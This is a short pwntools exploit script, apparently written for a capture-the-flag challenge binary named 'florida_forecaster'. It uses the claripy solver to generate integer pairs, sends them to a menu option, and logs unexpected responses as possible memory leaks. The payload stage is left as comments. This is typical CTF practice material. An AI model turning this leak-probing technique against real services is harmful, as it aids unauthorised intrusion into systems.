#!/usr/bin/python3
from pwn import *
import monkeyhex
import claripy

# context.log_level = 'debug'
context.terminal = ['termite', '-e']

#lib = ELF('/usr/lib/libc.so.6') if not args.REMOTE else ELF('')
binary = context.binary = ELF('florida_forecaster')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    """ if commands is None else commands
    return gdb.attach(p, val)


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    p = process(binary.path)
    if start_gdb is True:
        attach_gdb(p)
    return p

uvar1 = claripy.BVS('uvar1', 8*8)
uvar2 = claripy.BVS('uvar2', 8*8)
exp = claripy.And(uvar1 >= 1, -1 >= uvar2, (uvar1 ^ uvar2) == 0xc0c0c0c0)
solver = claripy.solvers.Solver()
num = 1000
vars1 = solver.eval(uvar1, num, extra_constraints=[exp])
vars2 = solver.eval(uvar2, num, extra_constraints=[exp])
constrained_matches = list(zip(vars1, vars2))
leaks = []
for v1, v2 in constrained_matches:
    p = new_proc() if not args.REMOTE else remote('', int(''))
    p.sendafter(b'Choice: ', b'3\n')

    p.sendafter(b'(integer): ', str(v1).encode() + b'\n')
    p.sendafter(b'(integer): ', str(v2).encode() + b'\n')
    p.recvuntil(b'\n')
    leak = p.recvuntil(b'\n')
    if re.search(b'(poison|sunglasses|engine|doorbell|roommate|straw|yoga|Taco|alligator|null|iguana)', leak) is None:
        leaks.append((leak, (v1, v2)))
    p.close()


for leak, v in leaks:
    print('leak %s' % str(leak))
    print('ints %s' % str(v))
    print()


# do leak / payload gen here


# if args.DEBUG is True:
#     attach_gdb(p)
# p.sendline(payload)
# if args.DEBUG is True:
#     import ipdb as pdb; pdb.set_trace()

# p.interactive()
